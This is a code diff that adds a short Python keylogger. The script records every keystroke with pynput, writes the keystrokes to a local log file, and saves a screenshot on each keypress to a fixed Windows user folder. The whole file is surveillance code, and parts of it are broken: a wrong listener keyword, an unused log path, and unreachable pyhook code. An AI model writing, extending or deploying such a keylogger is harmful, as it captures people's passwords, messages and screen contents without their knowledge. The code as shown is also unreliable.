@@ -1,0 +1,73 @@
+import sys
+import pynput
+from pynput.keyboard import Key,Listener
+import os
+import pyhook
+import random,string
+
+
+
+
+
+
+log_file = os.environ.get(
+    'pylogger_file',
+    os.path.expanduser('~/Downloads/file.log')
+)  
+cancel_key = ord(
+    os.environ.get(
+        'pylogger_cancel',
+        '`'
+    )[0]
+)
+   
+if os.environ.get('pylogger_clean', None) is not None:
+    try:
+        os.remove(log_file)
+    except EnvironmentError:  
+        pass
+
+
+def screen_shot():
+    import pyautogui
+    pyautogui.screenshot().save(r"c:\users\dvira\screenshot.png")
+
+
+counter=0
+count=0
+keys=[]
+def file_log(keys):
+    global counter,k
+    with open("file.log","a")as f:
+        for key in keys:
+            counter+=1
+            k=str(key).replace("'","")
+            if k.find("space")>0:
+                f.write(' ')
+            elif k.find("enter")>0:
+                f.write('\n')
+            elif k.find("key")==-1:
+                f.write(k)
+def onkeypress(key):
+    global keys,count
+    keys.append(key)
+    count+=1
+    screen_shot()
+    if count >=1:
+        count=0
+        file_log(keys)
+        keys=[]
+    pass
+
+
+with Listener (onkeypress=onkeypress) as listener:
+    listener.join()
+       
+
+
+hook = pyhook.HookManager()
+hook.KeyDown = onkeypress
+
+
+hook.HookKeyboard()
+hook.start()   
